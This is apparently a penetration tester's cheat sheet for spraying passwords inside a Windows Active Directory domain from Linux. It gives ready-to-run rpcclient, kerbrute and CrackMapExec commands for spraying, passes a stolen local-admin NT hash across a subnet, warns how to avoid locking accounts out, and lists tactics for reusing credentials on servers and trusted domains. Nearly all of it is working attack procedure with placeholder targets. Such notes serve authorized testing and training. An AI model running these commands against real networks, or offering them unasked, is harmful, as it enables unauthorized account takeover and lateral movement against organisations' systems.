# Internal Password Spraying — Linux

Pipe user list through rpcclient — `Authority Name` in response = valid login:

```bash
for u in $(cat <USERLIST>);do rpcclient -U "$u%<PASS>" -c "getusername;quit" <DC_IP> | grep Authority; done
```

Kerbrute spray — Kerberos pre-auth, quieter than SMB, still counts toward lockout:

```bash
kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> <USERLIST> <PASS>
```

CME spray — grep `+` to filter noise, only see hits:

```bash
sudo crackmapexec smb <DC_IP> -u <USERLIST> -p <PASS> | grep +
```

Validate a hit before moving on:

```bash
sudo crackmapexec smb <DC_IP> -u <USER> -p <PASS>
```

---

## Local Admin Hash Reuse

Got a local admin NT hash from SAM → spray it across the subnet. `--local-auth` is mandatory — without it CME auths against the domain and will lock out the domain admin account.

```bash
sudo crackmapexec smb --local-auth <CIDR> -u administrator -H <HASH> | grep +
```

`(Pwn3d!)` = local admin access confirmed on that host.

> [!warning] `--local-auth` must be set. Omitting it sprays as a domain account → potential domain admin lockout.

Got a local admin password with a pattern (e.g. `$desktop%@admin123`) → manually try `$server%@admin123` on servers. Non-standard local accounts (e.g. `bsmith`) → try same creds on matching domain account. Domain A creds → try against same username in Domain B if trust exists.

High-value spray targets: SQL servers, Exchange — privileged users more likely active or cached in memory.